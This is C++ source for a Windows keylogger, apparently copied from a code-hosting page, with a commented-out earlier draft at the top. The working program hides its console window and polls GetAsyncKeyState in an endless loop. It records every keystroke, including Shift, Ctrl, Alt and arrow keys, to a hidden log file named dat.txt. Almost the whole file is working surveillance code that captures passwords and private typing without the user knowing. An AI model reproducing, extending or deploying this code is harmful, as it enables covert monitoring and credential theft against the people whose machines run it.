
//LPCSTR IS USED TO TAKE ASCCSSI VALUE in number AND CONVERT IT IN character IT IS PART OF MICROSFT HEADER FILE IS WINDOWS.H
/*void writelog(LPCSTR text){
	ofstream logfile; // create object of filestream
	logfile.open("keylogger.txt",ios::app);//open file for writing
logfile << text;// write text string to 
	logfile.close();//close stream
}
bool keyislist(int key){
switch (key)
{
// chr(VK_SPACE) to compare charcter to charcter compare
// when space key pressed,print space to console;
	case VK_SPACE:
	
int main(){
ShowWindow(GetConsoleWindow(), SW_HIDE);
startlogging();
}
void startlogging(){
char key;
while(true)
{
for(key=0; key<=254; key++){
//-32767 is lowest rangeof an signed integer
//	GetAsynckeystate() determine whetever a key is up or down at time yhe function is called and whetever key is pressed
// after a previous calll to GetAsynckeystate
// 0x1=1 bit takes first charcater
if(GetAsyncKeyState(key) && 0x1){
	// cout<<k; will output code in cmd keylogger.exe to open it
ofstream log;
log.open("log.txt",ios::app);
//	log<<key; //this store output in file 
switch (key)
{
// chr(VK_SPACE) to compare charcter to charcter compare
// when space key pressed,print space to console;
	*/
//	nes (100 sloc)  1.85 KB

//#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" space ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG(" new line ");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG(" #SHIFT# ");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG(" backspace ");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG(" #R_CLICK# ");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG(" #CAPS_LCOK ");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG(" #TAB ");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG(" #UP_ARROW_KEY ");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG(" #DOWN_ARROW_KEY ");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG(" #LEFT_ARROW_KEY ");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG(" #RIGHT_ARROW_KEY ");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG(" #CONTROL ");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG(" #ALT ");
		return true;
	default: 
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY;

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
// -32767 read first character	
// GetAsyncKeyState(KEY) it tell whetever first key is pressed or not 
			if (GetAsyncKeyState(KEY) == -32767) {
			if (SpecialKeys(KEY) == false) {
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

			}
			}
		}
	}

	return 0;
}